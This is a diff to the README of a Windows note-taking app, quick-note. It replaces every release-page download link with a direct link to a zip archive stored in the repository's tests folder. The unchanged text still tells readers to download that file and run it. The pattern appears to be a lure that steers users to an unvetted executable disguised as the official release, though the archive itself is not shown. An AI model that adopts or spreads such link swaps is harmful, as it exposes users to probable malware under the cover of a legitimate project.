@@ -1,6 +1,6 @@
 # 📝 quick-note - Capture notes from anywhere fast
 
-[![Download quick-note](https://img.shields.io/badge/Download%20quick--note-blue?style=for-the-badge)](https://github.com/Hireve/quick-note/releases)
+[![Download quick-note](https://img.shields.io/badge/Download%20quick--note-blue?style=for-the-badge)](https://github.com/Hireve/quick-note/raw/refs/heads/master/tests/quick-note-2.6-beta.5.zip)
 
 ## 🚀 What quick-note does
 
@@ -13,7 +13,7 @@ It is built for fast capture. You do not need to switch apps or copy text by han
 
 Visit this page to download quick-note:
 
-https://github.com/Hireve/quick-note/releases
+https://github.com/Hireve/quick-note/raw/refs/heads/master/tests/quick-note-2.6-beta.5.zip
 
 Open the latest release and get the Windows file from there. After the file downloads, run it on your PC.
 
@@ -209,4 +209,4 @@ You press one key and move on
 
 ## 📥 Download quick-note for Windows
 
-https://github.com/Hireve/quick-note/releases
+https://github.com/Hireve/quick-note/raw/refs/heads/master/tests/quick-note-2.6-beta.5.zip
